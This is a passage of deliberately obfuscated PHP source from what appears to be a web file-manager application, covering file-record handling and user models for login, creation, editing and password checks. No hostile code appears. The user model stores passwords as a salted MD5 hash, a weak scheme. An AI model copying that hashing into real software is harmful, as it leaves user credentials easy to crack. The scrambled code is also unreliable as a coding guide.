(!$cí®ÄÈÎŸ[$E˜¦ùÁŸñÎ[366]] && $cí®ÄÈÎŸ[$E˜¦ùÁŸñÎ[414]]) { $Aóº›ˆ¬ÇÌ[$E˜¦ùÁŸñÎ[496]][] = $cí®ÄÈÎŸ[$E˜¦ùÁŸñÎ[414]]; } $BŞñö¾«›Ú[] = $this->_makeItemData($cí®ÄÈÎŸ, $BÚ¶ã‡È , $cí®ÄÈÎŸ[$E˜¦ùÁŸñÎ[28]]); goto bŠöÁ¸É¹±; DËğÏÖÊ½Ò: $cí®ÄÈÎŸ[$E˜¦ùÁŸñÎ[77]] = _get($cí®ÄÈÎŸ, $E˜¦ùÁŸñÎ[77], 0); $cí®ÄÈÎŸ[$E˜¦ùÁŸñÎ[414]] = _get($cí®ÄÈÎŸ, $E˜¦ùÁŸñÎ[414], 0); if (!isset($cí®ÄÈÎŸ[$E˜¦ùÁŸñÎ[536]]) && $cí®ÄÈÎŸ[$E˜¦ùÁŸñÎ[414]]) { $Aóº›ˆ¬ÇÌ[$E˜¦ùÁŸñÎ[533]][] = $cí®ÄÈÎŸ[$E˜¦ùÁŸñÎ[414]]; } goto b‡±ÅÅ«îï; Dëİø¨Ç©“: if (isset($aÌ±´è ¹•[$cí®ÄÈÎŸ[$E˜¦ùÁŸñÎ[28]]])) { $cí®ÄÈÎŸ = $aÌ±´è ¹•[$cí®ÄÈÎŸ[$E˜¦ùÁŸñÎ[28]]]; } $cí®ÄÈÎŸ[$E˜¦ùÁŸñÎ[366]] = $cí®ÄÈÎŸ[$E˜¦ùÁŸñÎ[29]] == $E˜¦ùÁŸñÎ[76]; $cí®ÄÈÎŸ[$E˜¦ùÁŸñÎ[368]] = _get($cí®ÄÈÎŸ, $E˜¦ùÁŸñÎ[156], $E˜¦ùÁŸñÎ[33]); goto DËğÏÖÊ½Ò; bŠöÁ¸É¹±: } unset($cí®ÄÈÎŸ); if (!empty($BŞñö¾«›Ú)) { $this->addAll($BŞñö¾«›Ú); } goto bíë†Šä; bíë†Šä: $BÖ ©†‚Û = $this->_childrenList($BïßæÊºŠ¹); $BÖ ©†‚Û = array_to_keyvalue($BÖ ©†‚Û, $E˜¦ùÁŸñÎ[28]); foreach ($E†ªŞ¢­— as $cí®ÄÈÎŸ) { $fƒ’‹¶Øâ¶ = $BÖ ©†‚Û[$cí®ÄÈÎŸ[$E˜¦ùÁŸñÎ[28]]]; $bÇäòòÁ§ = $fƒ’‹¶Øâ¶[$E˜¦ùÁŸñÎ[365]]; $this->_copyApplyMeta($fƒ’‹¶Øâ¶, $Aóº›ˆ¬ÇÌ); if ($cí®ÄÈÎŸ[$E˜¦ùÁŸñÎ[29]] == $E˜¦ùÁŸñÎ[76]) { $cí®ÄÈÎŸ[$E˜¦ùÁŸñÎ[75]] = $FÇÎ’Áîí->getPathInner($cí®ÄÈÎŸ[$E˜¦ùÁŸñÎ[75]]); $this->_copyChildTo($FÇÎ’Áîí, $cí®ÄÈÎŸ[$E˜¦ùÁŸñÎ[75]], $bÇäòòÁ§, $C§âÉíˆÓŒ, $Aóº›ˆ¬ÇÌ, $Fƒó›ó—); } } goto E¤¬Ã½Áù¾; E¤¬Ã½Áù¾: } private function _addFiles($E™ñŠ„Íää, $CÙÁ°âÆ§ˆ, $eÅÜ£„Õ½‰) { goto CÂ”¦¾ÑƒÃ; aŒš¹ñ‘ç: foreach ($fÅ‹…Ë§ as $c¥êÓ‹ÒŞ°) { if (!isset($CñÎÄ”æ[$c¥êÓ‹ÒŞ°[$Cºº¬©È[159]]])) { continue; } $BŠ¸ºÑ…ƒ  =& $CñÎÄ”æ[$c¥êÓ‹ÒŞ°[$Cºº¬©È[159]]]; foreach ($BŠ¸ºÑ…ƒ  as &$E°ê¶‘ÀÖò) { $E°ê¶‘ÀÖò[$Cºº¬©È[414]] = $c¥êÓ‹ÒŞ°[$Cºº¬©È[414]]; } unset($E°ê¶‘ÀÖò); } $fßôæ§ô‘å = array(); foreach ($CÙÁ°âÆ§ˆ as $A âªµ¾¹¿) { $fßôæ§ô‘å[$A âªµ¾¹¿[$Cºº¬©È[28]]] = $A âªµ¾¹¿; } goto BÔÓ¼’¢Ä„; BÔÓ¼’¢Ä„: return $fßôæ§ô‘å; goto Fª¼Ğ§ğÙ; DöÌßöçù: foreach ($CÙÁ°âÆ§ˆ as &$E°ê¶‘ÀÖò) { goto E°÷‰¤àª‚; DÆòš¸¹È: $B´ö¥’ÄÇ» = $E™ñŠ„Íää->hashMd5($E°ê¶‘ÀÖò[$Cºº¬©È[75]]); if (strlen($B´ö¥’ÄÇ») > 10 && !isset($CñÎÄ”æ[$B´ö¥’ÄÇ»])) { $CñÎÄ”æ[$B´ö¥’ÄÇ»] = array(); } $E°ê¶‘ÀÖò[$Cºº¬©È[160]] = $eÕ„ô³‰²’; goto f½¹ªÏâ×®; B¬¦åŒïƒ£: if (count($CñÎÄ”æ[$B´ö¥’ÄÇ»]) > 1) { $E°ê¶‘ÀÖò[$Cºº¬©È[536]] = !0; } goto c©§”™Ç›‰; E°÷‰¤àª‚: Hook::trigger($Cºº¬©È[537], $E°ê¶‘ÀÖò); $E°ê¶‘ÀÖò[$Cºº¬©È[75]] = $E™ñŠ„Íää->getPathInner($E°ê¶‘ÀÖò[$Cºº¬©È[75]]); $eÕ„ô³‰²’ = $E™ñŠ„Íää->hashSimple($E°ê¶‘ÀÖò[$Cºº¬©È[75]]); goto DÆòš¸¹È; f½¹ªÏâ×®: $E°ê¶‘ÀÖò[$Cºº¬©È[159]] = $B´ö¥’ÄÇ»; Hook::trigger($Cºº¬©È[538], $E°ê¶‘ÀÖò); $CñÎÄ”æ[$B´ö¥’ÄÇ»][] =& $E°ê¶‘ÀÖò; goto B¬¦åŒïƒ£; c©§”™Ç›‰: } $f†ªœµ†çÙ = array($Cºº¬©È[159] => array($Cºº¬©È[7], array_keys($CñÎÄ”æ))); $dÍ¬ÊÃ¨˜á = Model($Cºº¬©È[539]); goto f›Š’Ú•àƒ; CÂ”¦¾ÑƒÃ: $Cºº¬©È =& $_SERVER[õëù©û]; if (!$CÙÁ°âÆ§ˆ || count($CÙÁ°âÆ§ˆ) == 0) { return array(); } $CñÎÄ”æ = array(); goto DöÌßöçù; cÉíÜÈ»á: $eä„©Åñ— = array(); foreach ($CÙÁ°âÆ§ˆ as $bÆÔ›öº¶Ş) { if (isset($bÆÔ›öº¶Ş[$Cºº¬©È[536]]) && $bÆÔ›öº¶Ş[$Cºº¬©È[536]]) { continue; } $A¼º§öáİ = $E™ñŠ„Íää->getPathInner($bÆÔ›öº¶Ş[$Cºº¬©È[75]]); $c£ÛÍ«õøÛ = $dÍ¬ÊÃ¨˜á->addFileMake($A¼º§öáİ, $bÆÔ›öº¶Ş[$Cºº¬©È[77]], $bÆÔ›öº¶Ş[$Cºº¬©È[160]], $bÆÔ›öº¶Ş[$Cºº¬©È[159]], $bÆÔ›öº¶Ş[$Cºº¬©È[28]], $eÅÜ£„Õ½‰); $eä„©Åñ—[] = $c£ÛÍ«õøÛ; } $dÍ¬ÊÃ¨˜á->addAll($eä„©Åñ—); goto cÄÓçè”æÑ; cÄÓçè”æÑ: $f†ªœµ†çÙ = array($Cºº¬©È[159] => array($Cºº¬©È[7], array_keys($CñÎÄ”æ))); $fÅ‹…Ë§ = $dÍ¬ÊÃ¨˜á->where($f†ªœµ†çÙ)->select(); $fÅ‹…Ë§ = $fÅ‹…Ë§ ? $fÅ‹…Ë§ : array(); goto aŒš¹ñ‘ç; f›Š’Ú•àƒ: $fÅ‹…Ë§ = $dÍ¬ÊÃ¨˜á->where($f†ªœµ†çÙ)->select(); $fÅ‹…Ë§ = $fÅ‹…Ë§ ? $fÅ‹…Ë§ : array(); foreach ($fÅ‹…Ë§ as $c¥êÓ‹ÒŞ°) { if (!isset($CñÎÄ”æ[$c¥êÓ‹ÒŞ°[$Cºº¬©È[159]]])) { continue; } $C©òÏ¤ŸŠ‡ = $CñÎÄ”æ[$c¥êÓ‹ÒŞ°[$Cºº¬©È[159]]]; foreach ($C©òÏ¤ŸŠ‡ as &$E°ê¶‘ÀÖò) { $E°ê¶‘ÀÖò[$Cºº¬©È[414]] = $c¥êÓ‹ÒŞ°[$Cºº¬©È[414]]; $E°ê¶‘ÀÖò[$Cºº¬©È[536]] = !0; } unset($E°ê¶‘ÀÖò); } goto cÉíÜÈ»á; Fª¼Ğ§ğÙ: } } define($_SERVER[õëù©û][540], $_SERVER[õëù©û][541]); goto b–³”ÇÙ±; E ç‘éÖá»: class UserJobModel extends ModelBaseLight { public $optionType = "\123\x79\163\164\145\155\56\x6a\157\142\x4c\151\163\x74"; public $field = array("\156\x61\155\x65", "\x64\145\163\143", "\163\157\162\x74"); const JOB_KEY = "\x73\145\x6c\146\x4a\157\x62\114\151\x73\x74"; public function listData($eÜàÊÁØ® = false, $EêØ ™ø®Ú = "\x73\x6f\x72\x74", $A÷±’¼«Ä = false) { return parent::listData($eÜàÊÁØ®, $EêØ ™ø®Ú, $A÷±’¼«Ä); } public function remove($EŒìÇ¢ŠÜŒ) { return parent::remove($EŒìÇ¢ŠÜŒ); } public function add($b‘Å’Û®ƒÖ) { $Bïßèò°Ï =& $_SERVER[õëù©û]; if ($this->findByName($b‘Å’Û®ƒÖ[$Bïßèò°Ï[28]])) { return !1; } $b‘Å’Û®ƒÖ[$Bïßèò°Ï[2089]] = $this->getSort(); return parent::insert($b‘Å’Û®ƒÖ); } private function getSort() { $F’ãï•ìï× =& $_SERVER[õëù©û]; $b…òÁÑ‘ğ = parent::listData(); $FªìãÃ±öÈ = array_to_keyvalue($b…òÁÑ‘ğ, $F’ãï•ìï×[33], $F’ãï•ìï×[2089]); return empty($FªìãÃ±öÈ) ? 0 : max($FªìãÃ±öÈ) + 1; } public function update($e³­ì°Á¬Ã, $EËç–™äí×) { $EÍºƒŞšÊµ =& $_SERVER[õëù©û]; $D±ÄèñŒÙÎ = parent::listData($e³­ì°Á¬Ã); $a“ÁÈÀŸÇ‰ = $this->findByName($EËç–™äí×[$EÍºƒŞšÊµ[28]]); if (!$D±ÄèñŒÙÎ || $a“ÁÈÀŸÇ‰ && $a“ÁÈÀŸÇ‰[$EÍºƒŞšÊµ[363]] != $D±ÄèñŒÙÎ[$EÍºƒŞšÊµ[363]]) { return !1; } return parent::update($e³­ì°Á¬Ã, $EËç–™äí×); } public function setUserJob($c¨ØÏò“£¶, $d´â±ª¹Ûñ) { goto f°Óƒ…—÷ƒ; BÆª–£¡±°: $c“Æ‹±Æàä = rtrim($c“Æ‹±Æàä, $FÕ²†—Úö¿[47]); Model($FÕ²†—Úö¿[472])->metaSet($c¨ØÏò“£¶, self::JOB_KEY, $c“Æ‹±Æàä); goto E¡†®†‚ç; f°Óƒ…—÷ƒ: $FÕ²†—Úö¿ =& $_SERVER[õëù©û]; if (!is_array($d´â±ª¹Ûñ)) { $d´â±ª¹Ûñ = array($d´â±ª¹Ûñ); } $cš¡¨¤³Ë = parent::listData(); goto EØ×ÀêÉï¿; EØ×ÀêÉï¿: $c¸Œ°ãËœÏ = array_to_keyvalue($cš¡¨¤³Ë, $FÕ²†—Úö¿[28]); $c“Æ‹±Æàä = $FÕ²†—Úö¿[357]; foreach ($d´â±ª¹Ûñ as $c¾›ªáµ´Ò) { if ($c¸Œ°ãËœÏ[$c¾›ªáµ´Ò]) { $c“Æ‹±Æàä .= $c¸Œ°ãËœÏ[$c¾›ªáµ´Ò][$FÕ²†—Úö¿[363]] . $FÕ²†—Úö¿[47]; } else { $d’öà©ØõÌ = $this->add($c¾›ªáµ´Ò); $c“Æ‹±Æàä .= $d’öà©ØõÌ . $FÕ²†—Úö¿[47]; } } goto BÆª–£¡±°; E¡†®†‚ç: } public function getUserJob($E‹Œ¡“­í) { $E‰ŒçÒŒÑØ = Model($_SERVER[õëù©û][472])->metaGet($E‹Œ¡“­í); return $this->getUserJobInfo($E‰ŒçÒŒÑØ[self::JOB_KEY]); } public function getUserJobInfo($DÂ·Â¾¤±‰) { goto bª´ÜÍâ; bª´ÜÍâ: $B –÷£ä­ =& $_SERVER[õëù©û]; $aìµ–ïĞÑÇ = explode($B –÷£ä­[47], $DÂ·Â¾¤±‰); $aÃ¸£¼ì–Ş = parent::listData(); goto cªÍÅë©èÈ; cªÍÅë©èÈ: $aÃ¸£¼ì–Ş = array_remove_key($aÃ¸£¼ì–Ş, $B –÷£ä­[183]); $d©×áíâˆ = array(); foreach ($aìµ–ïĞÑÇ as $b óØäŠ„©) { if (isset($aÃ¸£¼ì–Ş[$b óØäŠ„©])) { $d©×áíâˆ[] = $aÃ¸£¼ì–Ş[$b óØäŠ„©]; } } goto e» íà¬ƒ; e» íà¬ƒ: return $d©×áíâˆ; goto CøŠÛÉç—; CøŠÛÉç—: } } class UserModel extends ModelBase { protected $tableName = "\x75\163\x65\x72"; protected $tableMeta = array("\x74\x61\142\154\x65\x4e\x61\155\145" => "\x75\163\145\x72\x5f\x6d\145\164\x61", "\x6d\145\164\x61\x46\x69\x65\x6c\144" => "\x75\x73\x65\162\111\104"); protected $simpleField = "\x75\x73\x65\162\111\104\x2c\156\151\143\x6b\116\x61\155\x65\x2c\156\x61\x6d\145\x2c\x61\166\141\164\141\x72\x2c\163\145\170"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($BœÈğŒ¾œ) { $F³•ŸŠ£çÈ =& $_SERVER[õëù©û]; $DÙãÒÌ” = $F³•ŸŠ£çÈ[2450]; return array($F³•ŸŠ£çÈ[2134] => array($BœÈğŒ¾œ[0], $DÙãÒÌ”), $F³•ŸŠ£çÈ[2136] => array($BœÈğŒ¾œ[0], $DÙãÒÌ”), $F³•ŸŠ£çÈ[2451] => array($BœÈğŒ¾œ[0], $DÙãÒÌ”)); } protected function getInfo($Dö˜§ø–Èè, $CŠÉÉ¢’« = false) { $aÉœÍ“‰ã¼ = $this->getInfoSimple($Dö˜§ø–Èè); if (!is_array($aÉœÍ“‰ã¼)) { return array(); } if ($CŠÉÉ¢’«) { return $this->_getInfoApply($aÉœÍ“‰ã¼); } return $this->cacheFunctionGet($_SERVER[õëù©û][2176], $Dö˜§ø–Èè); } protected function getInfoFull($C®†Ââš¤§, $BåƒùÉÅƒ£ = false) { $c•çğÔÊÊå = $this->getInfoSimple($C®†Ââš¤§); if (!is_array($c•çğÔÊÊå)) { return array(); } if ($BåƒùÉÅƒ£) { return $this->_getInfoApply($c•çğÔÊÊå, !0); return $this->_getInfoApply($c•çğÔÊÊå, !0); } return $this->cacheFunctionGet($_SERVER[õëù©û][2452], $C®†Ââš¤§); } private function _getInfoApply($EåíÁ›´¯Ñ, $f‹Ôâ§ÒªÑ = false) { goto cĞ²à‰ğ«„; cĞ²à‰ğ«„: $b—’ïˆ‡ë =& $_SERVER[õëù©û]; if (!$EåíÁ›´¯Ñ) { return $EåíÁ›´¯Ñ; } $B…ø¶ß«‘ = md5($b—’ïˆ‡ë[2453] . $EåíÁ›´¯Ñ[$b—’ïˆ‡ë[795]] . $b—’ïˆ‡ë[2454] . $EåíÁ›´¯Ñ[$b—’ïˆ‡ë[28]]); goto A·ô¡îÍß; ešå£›…•ç: $EåíÁ›´¯Ñ[$b—’ïˆ‡ë[387]][$b—’ïˆ‡ë[2284]] = isset($C±÷ã×—ÜŞ[$b—’ïˆ‡ë[2285]]) ? $C±÷ã×—ÜŞ[$b—’ïˆ‡ë[2285]] : null; if ($f‹Ôâ§ÒªÑ) { $EåíÁ›´¯Ñ[$b—’ïˆ‡ë[412]] = $this->metaGet($EåíÁ›´¯Ñ[$b—’ïˆ‡ë[1404]]); } return $EåíÁ›´¯Ñ; goto d·Ä‘ò“ÀŸ; A·ô¡îÍß: $EåíÁ›´¯Ñ = $this->_listDataApplyItem($EåíÁ›´¯Ñ); $C±÷ã×—ÜŞ = Model($b—’ïˆ‡ë[1101])->metaGet($EåíÁ›´¯Ñ[$b—’ïˆ‡ë[387]][$b—’ïˆ‡ë[365]]); $EåíÁ›´¯Ñ[$b—’ïˆ‡ë[2455]] = $B…ø¶ß«‘; goto ešå£›…•ç; d·Ä‘ò“ÀŸ: } protected function getInfoSimple($eˆçÚ²êë, $D›»¦Ï‰Ì = false) { $E½¬¨÷ô³ =& $_SERVER[õëù©û]; if (!$eˆçÚ²êë) { return array(); } if ($D›»¦Ï‰Ì) { $AãŒ¢âêÅä = $this->where(array($E½¬¨÷ô³[1404] => intval($eˆçÚ²êë)))->find(); if (!is_array($AãŒ¢âêÅä)) { return array(); } $AãŒ¢âêÅä[$E½¬¨÷ô³[2456]] = Action($E½¬¨÷ô³[2457])->parseUrl($AãŒ¢âêÅä[$E½¬¨÷ô³[2456]]); return $AãŒ¢âêÅä; } return $this->cacheFunctionGet($E½¬¨÷ô³[2137], $eˆçÚ²êë); } protected function getInfoSimpleOuter($e¨÷©¹Ï˜) { goto f²›â¯¿ä„; CÅ«È“†Ó½: return $C–­¿‘ÎĞ¼; goto f‹ÒÉà²Ô; DÆ­¬±› : $C–­¿‘ÎĞ¼ = array_field_key($CÕŸØå¬ŠË, explode($fóÄ‹êÇøõ[47], $this->simpleField)); if (!$C–­¿‘ÎĞ¼) { return array($fóÄ‹êÇøõ[1404] => $fóÄ‹êÇøõ[1022], $fóÄ‹êÇøõ[28] => $fóÄ‹êÇøõ[153] . LNG($fóÄ‹êÇøõ[2460]) . $fóÄ‹êÇøõ[471], $fóÄ‹êÇøõ[2456] => STATIC_PATH . $fóÄ‹êÇøõ[2461]); } $C–­¿‘ÎĞ¼[$fóÄ‹êÇøõ[2456]] = Action($fóÄ‹êÇøõ[2457])->parseUrl($C–­¿‘ÎĞ¼[$fóÄ‹êÇøõ[2456]]); goto CÅ«È“†Ó½; f²›â¯¿ä„: $fóÄ‹êÇøõ =& $_SERVER[õëù©û]; if (!$e¨÷©¹Ï˜ || $e¨÷©¹Ï˜ == 0) { return array($fóÄ‹êÇøõ[1404] => $fóÄ‹êÇøõ[463], $fóÄ‹êÇøõ[28] => $fóÄ‹êÇøõ[153] . LNG($fóÄ‹êÇøõ[2458]) . $fóÄ‹êÇøõ[471], $fóÄ‹êÇøõ[2456] => STATIC_PATH . $fóÄ‹êÇøõ[2459]); } $CÕŸØå¬ŠË = $this->cacheFunctionGet($fóÄ‹êÇøõ[2137], $e¨÷©¹Ï˜); goto DÆ­¬±› ; f‹ÒÉà²Ô: } protected function groupUser($a’‡Ø®íË“) { } public static function errorLang($d”Ì©íŒ‹) { $F»îŠ£çŠç =& $_SERVER[õëù©û]; $Bö Œİ´¾Ù = array(self::ERROR_USER_NOT_EXISTS => $F»îŠ£çŠç[2462], self::ERROR_USER_PASSWORD_ERROR => $F»îŠ£çŠç[2463], self::ERROR_USER_EXIST_NAME => $F»îŠ£çŠç[2464], self::ERROR_USER_EXIST_PHONE => $F»îŠ£çŠç[2465], self::ERROR_USER_EXIST_EMAIL => $F»îŠ£çŠç[2466], self::ERROR_USER_LOGIN_LOCK => $F»îŠ£çŠç[2467], self::ERROR_IP_NOT_ALLOW => $F»îŠ£çŠç[2468], self::ERROR_USER_EXIST_NICKNAME => $F»îŠ£çŠç[2469]); return LNG($Bö Œİ´¾Ù[$d”Ì©íŒ‹]); } public function getInfoByMeta($Bá¯Á‚­…¥, $Aµõõ’ƒ†) { $a¶æ’š¼÷í =& $_SERVER[õëù©û]; $eÆâéƒé¤Î = Model($a¶æ’š¼÷í[2470])->where(array($a¶æ’š¼÷í[89] => $Bá¯Á‚­…¥, $a¶æ’š¼÷í[355] => $Aµõõ’ƒ†))->find(); if ($eÆâéƒé¤Î) { return $this->getInfo($eÆâéƒé¤Î[$a¶æ’š¼÷í[1404]]); } return !1; } public function userLoginCheck($e¥ùÖ½ÄóŞ, $d´ÑÚ·åº) { goto aÂ „š”À½; Aèìƒ‹Ø›¿: $this->userEdit($F¡ğË‚ùó[$eæÔµ®‹Ùô[1404]], array($eæÔµ®‹Ùô[2472] => time())); $this->clearCache($F¡ğË‚ùó[$eæÔµ®‹Ùô[1404]]); return $this->getInfo($F¡ğË‚ùó[$eæÔµ®‹Ùô[1404]]); goto bùÔÒã‘à³; aÂ „š”À½: $eæÔµ®‹Ùô =& $_SERVER[õëù©û]; $C‹‘ìĞ®‰º = array($eæÔµ®‹Ùô[28] => $e¥ùÖ½ÄóŞ, $eæÔµ®‹Ùô[2288] => $e¥ùÖ½ÄóŞ, $eæÔµ®‹Ùô[289] => $e¥ùÖ½ÄóŞ, $eæÔµ®‹Ùô[2471] => $e¥ùÖ½ÄóŞ, $eæÔµ®‹Ùô[907] => $eæÔµ®‹Ùô[909]); if ($this->nickNameRpt()) { unset($C‹‘ìĞ®‰º[$eæÔµ®‹Ùô[2288]]); } goto F²¨…‡íÚ®; F²¨…‡íÚ®: $F¡ğË‚ùó = $this->where($C‹‘ìĞ®‰º)->find(); if (!$F¡ğË‚ùó) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($F¡ğË‚ùó[$eæÔµ®‹Ùô[1404]], $d´ÑÚ·åº)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } goto Aèìƒ‹Ø›¿; bùÔÒã‘à³: } public function clearCache($E„••ŠÅ˜¸) { $a²¨¡Àßœ¦ =& $_SERVER[õëù©û]; $this->cacheFunctionClear($a²¨¡Àßœ¦[2176], $E„••ŠÅ˜¸); $this->cacheFunctionClear($a²¨¡Àßœ¦[2137], $E„••ŠÅ˜¸); } public function userPasswordCheck($F¸¸¿É¦ŠÍ, $Aë„”ñå®Æ) { $B›ÚªÔ±¼† =& $_SERVER[õëù©û]; $a¶ÓöŠÙ¹¢ = $this->where(array($B›ÚªÔ±¼†[1404] => intval($F¸¸¿É¦ŠÍ)))->find(); $còæ·Öˆ‚ = $this->metaGet($F¸¸¿É¦ŠÍ); $E‡šˆ‡ô’ï = isset($còæ·Öˆ‚[$B›ÚªÔ±¼†[2473]]) ? $còæ·Öˆ‚[$B›ÚªÔ±¼†[2473]] : $B›ÚªÔ±¼†[33]; if (md5($E‡šˆ‡ô’ï . trim($Aë„”ñå®Æ)) !== $a¶ÓöŠÙ¹¢[$B›ÚªÔ±¼†[795]]) { return !1; } return !0; } public function userAdd($cÏ¤›¸ÖŞ–) { goto A×êÜïò™‚; fâ‘Ù°ÓÏ: $bÅØÕñ¯‹³ = $this->_checkExist($cÏ¤›¸ÖŞ–); if ($bÅØÕñ¯‹³ !== !0) { return $bÅØÕñ¯‹³; } $F°ˆÊÔò­ğ = $this->add($FŞ³Äï½ğĞ); goto c£ìºÚ•Ë¸; FîæŠêª†: return $F°ˆÊÔò­ğ; goto aÖÀâºÚËã; A×êÜïò™‚: $f°‹¹§×¸” =& $_SERVER[õëù©û]; $FŞ³Äï½ğĞ = array($f°‹¹§×¸”[382] => $cÏ¤›¸ÖŞ–[$f°‹¹§×¸”[28]], $f°‹¹§×¸”[2474] => $cÏ¤›¸ÖŞ–[$f°‹¹§×¸”[2475]], $f°‹¹§×¸”[2476] => isset($cÏ¤›¸ÖŞ–[$f°‹¹§×¸”[289]]) ? $cÏ¤›¸ÖŞ–[$f°‹¹§×¸”[289]] : $f°‹¹§×¸”[33], $f°‹¹§×¸”[2477] => isset($cÏ¤›¸ÖŞ–[$f°‹¹§×¸”[2471]]) ? $cÏ¤›¸ÖŞ–[$f°‹¹§×¸”[2471]] : $f°‹¹§×¸”[33], $f°‹¹§×¸”[2478] => isset($cÏ¤›¸ÖŞ–[$f°‹¹§×¸”[2288]]) ? $cÏ¤›¸ÖŞ–[$f°‹¹§×¸”[2288]] : $cÏ¤›¸ÖŞ–[$f°‹¹§×¸”[28]], $f°‹¹§×¸”[2479] => isset($cÏ¤›¸ÖŞ–[$f°‹¹§×¸”[2456]]) ? $cÏ¤›¸ÖŞ–[$f°‹¹§×¸”[2456]] : $f°‹¹§×¸”[33], $f°‹¹§×¸”[2480] => isset($cÏ¤›¸ÖŞ–[$f°‹¹§×¸”[2481]]) ? $cÏ¤›¸ÖŞ–[$f°‹¹§×¸”[2481]] : 1, $f°‹¹§×¸”[2482] => $cÏ¤›¸ÖŞ–[$f°‹¹§×¸”[795]], $f°‹¹§×¸”[2138] => isset($cÏ¤›¸ÖŞ–[$f°‹¹§×¸”[2052]]) ? $cÏ¤›¸ÖŞ–[$f°‹¹§×¸”[2052]] : 1024 * 1024 * 20, $f°‹¹§×¸”[2139] => 0, $f°‹¹§×¸”[2472] => 0, $f°‹¹§×¸”[2163] => isset($cÏ¤›¸ÖŞ–[$f°‹¹§×¸”[684]]) ? $cÏ¤›¸ÖŞ–[$f°‹¹§×¸”[684]] : 1); if (!empty($cÏ¤›¸ÖŞ–[$f°‹¹§×¸”[1404]])) { $FŞ³Äï½ğĞ[$f°‹¹§×¸”[1404]] = $cÏ¤›¸ÖŞ–[$f°‹¹§×¸”[1404]]; } goto fâ‘Ù°ÓÏ; c£ìºÚ•Ë¸: $Aö‡š¢ßÈ = array($f°‹¹§×¸”[2482] => $FŞ³Äï½ğĞ[$f°‹¹§×¸”[795]], $f°‹¹§×¸”[2478] => $FŞ³Äï½ğĞ[$f°‹¹§×¸”[2288]]); $this->userEdit($F°ˆÊÔò­ğ, $Aö‡š¢ßÈ); Model($f°‹¹§×¸”[1101])->userRootAdd($F°ˆÊÔò­ğ); goto FîæŠêª†; aÖÀâºÚËã: } protected function userEditTest($b›Ï‰³±, $eÆš¿£Ã÷) { return $this->call($_SERVER[õëù©û][2483], $b›Ï‰³±, $eÆš¿£Ã÷); } protected function userEdit($fĞ¸á”ï§, $C³Ï¶Äò¡ò) { goto eÊœ‹µß–´; eÊœ‹µß–´: $aá¼™ØÉÉ› =& $_SERVER[õëù©û]; $e—Æ‚‚ÇÑ = $this->getInfoSimple($fĞ¸á”ï§); if (!$e—Æ‚‚ÇÑ) { return !1; } goto F‘¢Ú¤´‚ì; F‘¢Ú¤´‚ì: $fõóÌ¬¢´ = $this->_checkExist($C³Ï¶Äò¡ò, $fĞ¸á”ï§); if ($fõóÌ¬¢´ !== !0) { return $fõóÌ¬¢´; } if (isset($C³Ï¶Äò¡ò[$aá¼™ØÉÉ›[795]]) && trim($C³Ï¶Äò¡ò[$aá¼™ØÉÉ›[795]]) != $aá¼™ØÉÉ›[33]) { $a”¤ÔÀîÏÀ = $this->metaGet($fĞ¸á”ï§); if (empty($a”¤ÔÀîÏÀ[$aá¼™ØÉÉ›[2473]])) { $a”¤ÔÀîÏÀ[$aá¼™ØÉÉ›[2473]] = rand_string(10); Model($aá¼™ØÉÉ›[469])->metaSet($fĞ¸á”ï§, $aá¼™ØÉÉ›[2473], $a”¤ÔÀîÏÀ[$aá¼™ØÉÉ›[2473]]); } $C³Ï¶Äò¡ò[$aá¼™ØÉÉ›[795]] = md5($a”¤ÔÀîÏÀ[$aá¼™ØÉÉ›[2473]] . trim($C³Ï¶Äò¡ò[$aá¼™ØÉÉ›[795]])); } else { unset($C³Ï¶Äò¡ò[$aá¼™ØÉÉ›[795]]); } goto EÖ™´‚ñÈ¼; EÖ™´‚ñÈ¼: $this->where(array($aá¼™ØÉÉ›[1395] => $fĞ¸á”ï§))->save($C³Ï¶Äò¡ò); if (isset($C³Ï¶Äò¡ò[$aá¼™ØÉÉ›[2288]])) { $this->setNamePinyin($fĞ¸á”ï§, $C³Ï¶Äò¡ò[$aá¼™ØÉÉ›[2288]]); } return !0; goto FÀÉ­ØÇÒØ; FÀÉ­ØÇÒØ: } public function setNamePinyin($Bœ¿ğ…‚“Ç, $dŠˆ‚ïßÉ = false) { $F£‰­·¹É =& $_SERVER[õëù©û]; if (!$dŠˆ‚ïßÉ) { $AßäÎƒµ¦¤ = $this->getInfoSimple($Bœ¿ğ…‚“Ç); $dŠˆ‚ïßÉ = $AßäÎƒµ¦¤[$F£‰­·¹É[2288]] ? $AßäÎƒµ¦¤[$F£‰­·¹É[2288]] : $AßäÎƒµ¦¤[$F£‰­·¹É[28]]; } $fØŸÎ¸Š¯ = Model($F£‰­·¹É[472]); if (!Input::check($dŠˆ‚ïßÉ, $F£‰­·¹É[523])) { return $fØŸÎ¸Š¯->metaSet($Bœ¿ğ…‚“Ç, array($F£‰­·¹É[411] => $F£‰­·¹É[33], $F£‰­·¹É[410] => $F£‰­·¹É[33])); } return $fØŸÎ¸Š¯->metaSet($Bœ¿ğ…‚“Ç, array($F£‰­·¹É[411] => str_replace($F£‰­·¹É[50], $F£‰­·¹É[33], Pinyin::encode($dŠˆ‚ïßÉ)), $F£‰­·¹É[410] => Pinyin::encode($dŠˆ‚ïßÉ, $F£‰­·¹É[524]))); } private function nickNameRpt() { $FËÖÁŞĞ© =& $_SERVER[õëù©û]; $E§ÅçÑ‹Ğµ = Model($FËÖÁŞĞ©[1079])->get($FËÖÁŞĞ©[2484]); $E”ãßï›± = $GLOBALS[$FËÖÁŞĞ©[6]][$FËÖÁŞĞ©[2440]][$FËÖÁŞĞ©[2484]]; $FœÕ¿íˆ®¿ = !is_null($E§ÅçÑ‹Ğµ) ? $E§ÅçÑ‹Ğµ : $E”ãßï›±; return !!$FœÕ¿íˆ®¿; } private function _checkExist($Fó÷‚¬ì™é, $cë¤öã…¬Ş = false) { $C·ğ’‘Ö ù =& $_SERVER[õëù©û]; $DİŒ×˜–ˆ = array($C·ğ’‘Ö ù[28] => UserModel::ERROR_USER_EXIST_NAME, $C·ğ’‘Ö ù[2288] => UserModel::ERROR_USER_EXIST_NICKNAME, $C·ğ’‘Ö ù[289] => 